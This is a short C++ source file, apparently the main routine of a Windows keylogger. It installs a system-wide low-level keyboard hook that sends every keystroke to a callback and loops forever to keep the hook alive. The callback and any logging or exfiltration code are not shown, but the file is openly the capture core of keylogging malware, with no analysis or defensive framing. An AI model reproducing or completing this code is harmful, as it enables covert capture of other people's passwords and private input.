#include "keyLogger.hpp"

int main(int argc, char* argv[])
{
	ShowWindow(GetConsoleWindow(), 1);

	auto hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyBoardCallBack, NULL, NULL);
	MSG message;
	while (true)
		GetMessage(&message, NULL, NULL, NULL);
}